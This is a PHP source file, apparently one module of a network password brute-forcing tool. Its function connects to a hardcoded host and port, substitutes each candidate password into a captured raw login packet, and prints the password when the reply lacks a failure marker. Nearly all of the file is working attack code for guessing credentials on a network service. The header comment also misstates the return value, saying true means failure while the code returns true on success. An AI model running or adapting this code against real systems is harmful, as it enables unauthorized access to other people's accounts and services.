//*****************************************************************************
//  Generic Network Brute-force 
//*****************************************************************************
//  file: host_login.php
//        this file is part of Generic Network Brutforce
//*****************************************************************************
//    This function is creating socket and connecting to the host IP addres 
//  with specific port. Then at first receiving a TCP message. After that we 
//  changing in authentication message the password and sending it back to the
//  to the host. Then from the host we receiving second message. 
//    If authentication failed function returning true.
//    LOGIN_RAW_DATA is the hex data of authentication with login and password
//  wich is located in login_data_1020.raw file.
//*****************************************************************************
//  Author: Ara Khachatryan 
//*****************************************************************************

<?php

	function tcp_login( $password ){
		
	    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)
			or die("Unable to create socket\n");
	      
		//socket_set_option($socket, SOL_SOCKET, SO_REUSEADDR, 1)
		//    or die("Unable to set option on socket: ".socket_strerror(socket_last_error()) );
		
		//socket_bind( $socket, '10.1.1.122', 7777 )
		//	or die("Unable to bind socket\n".socket_strerror(socket_last_error($sock)));
			
		//socket_getsockname($socket, $IP, $PRT);
		//print $IP.":".$PRT."\n";
			
		socket_connect($socket, "10.1.1.16", 3000);
		
		// Receive first reply from the host
		socket_recv($socket, $receive_data1, 564, MSG_WAITALL);
		
		$login_data = preg_replace("#1020#", $password, LOGIN_RAW_DATA);

		// Send login_data to the host
		socket_write($socket, $login_data, 116); 	
	   	
		// Receive second reply from the host
		socket_recv($socket, $receive_data2, 68, MSG_WAITALL);
		
		if( !preg_match("#COMMAND_LOGIN_FAIL#", $receive_data2)){
			echo "password is: ".$password;
			return true;
		}
		
		socket_close($socket);
		
		return false;
	}

?>
